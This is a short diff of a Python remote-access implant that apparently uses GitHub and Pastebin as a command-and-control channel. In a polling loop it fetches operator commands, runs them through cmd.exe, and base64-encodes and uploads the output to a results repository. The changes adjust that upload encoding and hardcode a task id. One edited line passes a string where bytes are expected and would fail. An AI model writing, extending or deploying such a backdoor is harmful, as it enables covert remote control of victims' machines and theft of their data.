@@ -315,7 +315,7 @@ def usePasteBin():
             print(f"<=+] Command retrieved From GitHub C2 Server: {command}")
             command_result = subprocess.run(["cmd.exe", "/c", command], text=True, capture_output=True)
             print(f"[*] Execute The Command: {command}")
-            uploadResultToC2(str(base64.b64encode(str.encode(command_result.stdout))), repo_id_result)
+            uploadResultToC2(str(base64.b64encode(command_result.stdout)), repo_id_result)
             print(f"[+=>] Result Of The Command Uploaded")
         
 
@@ -325,7 +325,7 @@ def useGithub():
 
     repo_id_result = getGithubRepoID(C2_RESULT_REPO)
     repo_id_c2server = getGithubRepoID(C2_GITHUB_REPO)
-    task_id = 15098867
+    task_id = 15100353 # manual for now
 
     while True:
         print("[*] Expecting the next task id")
@@ -349,7 +349,7 @@ def useGithub():
                 print(f"<=+] Command retrieved From GitHub C2 Server: {command}")
                 command_result = subprocess.run(["cmd.exe", "/c", command], text=True, capture_output=True)
                 print(f"[*] Execute The Command: {command}")
-                uploadResultToC2(str(base64.b64encode(str.encode(command_result.stdout))), repo_id_result)
+                uploadResultToC2(base64.b64encode(str.encode(command_result.stdout)).decode('utf-8'), repo_id_result)
                 print(f"[+=>] Result Of The Command Uploaded")
             task_id = expected_task_id
         sleep(60)        
